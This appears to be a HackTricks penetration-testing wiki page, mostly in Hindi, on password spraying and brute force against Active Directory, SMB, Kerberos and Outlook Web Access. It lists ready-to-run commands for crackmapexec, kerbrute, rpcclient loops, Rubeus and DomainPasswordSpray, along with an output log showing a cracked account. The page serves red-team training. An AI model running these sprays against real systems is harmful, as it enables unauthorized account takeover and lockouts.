# Password Spraying / Brute Force

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}

## **Password Spraying**

एक बार जब आप कई **मान्य उपयोगकर्ता नाम** ढूंढ लेते हैं, तो आप प्रत्येक खोजे गए उपयोगकर्ता के साथ सबसे **सामान्य पासवर्ड** (पर्यावरण की पासवर्ड नीति को ध्यान में रखते हुए) आजमा सकते हैं।\
**डिफ़ॉल्ट** रूप से **न्यूनतम** **पासवर्ड** **लंबाई** **7** है।

सामान्य उपयोगकर्ता नामों की सूचियाँ भी उपयोगी हो सकती हैं: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

ध्यान दें कि यदि आप कई गलत पासवर्ड आजमाते हैं तो आप **कुछ खातों को लॉक कर सकते हैं** (डिफ़ॉल्ट रूप से 10 से अधिक)।

### पासवर्ड नीति प्राप्त करें

यदि आपके पास कुछ उपयोगकर्ता क्रेडेंशियल्स या एक डोमेन उपयोगकर्ता के रूप में एक शेल है, तो आप **पासवर्ड नीति प्राप्त कर सकते हैं**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux से शोषण (या सभी)

* **crackmapexec** का उपयोग करते हुए:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
* [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) का उपयोग करना
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
* [**spray**](https://github.com/Greenwolf/Spray) _**(आप लॉकआउट से बचने के लिए प्रयासों की संख्या निर्दिष्ट कर सकते हैं):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
* Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - अनुशंसित नहीं है कभी-कभी काम नहीं करता
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
* `scanner/smb/smb_login` मॉड्यूल के साथ **Metasploit**:

![](<../../.gitbook/assets/image (745).png>)

* **rpcclient** का उपयोग करते हुए:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### From Windows

* [Rubeus](https://github.com/Zer1t0/Rubeus) के ब्रूट मॉड्यूल के साथ संस्करण:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
* [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) के साथ (यह डिफ़ॉल्ट रूप से डोमेन से उपयोगकर्ताओं को उत्पन्न कर सकता है और यह डोमेन से पासवर्ड नीति प्राप्त करेगा और इसके अनुसार प्रयासों को सीमित करेगा):
```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
* [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) के साथ
```
Invoke-SprayEmptyPassword
```
## ब्रूट फोर्स

{% code overflow="wrap" %}
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
{% endcode %}

## Outlook Web Access

p**assword spraying outlook** के लिए कई उपकरण हैं।

* [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/) के साथ
* [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/) के साथ
* [Ruler](https://github.com/sensepost/ruler) के साथ (विश्वसनीय!)
* [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) के साथ (Powershell)
* [MailSniper](https://github.com/dafthack/MailSniper) के साथ (Powershell)

इनमें से किसी भी उपकरण का उपयोग करने के लिए, आपको एक उपयोगकर्ता सूची और एक पासवर्ड / पासवर्ड की एक छोटी सूची की आवश्यकता है।
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

* [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

* [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
* [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
* [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
* [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
* [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
* [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

अपने **मोबाइल सुरक्षा** में विशेषज्ञता को 8kSec अकादमी के साथ गहरा करें। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर हमें फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।**

</details>
{% endhint %}
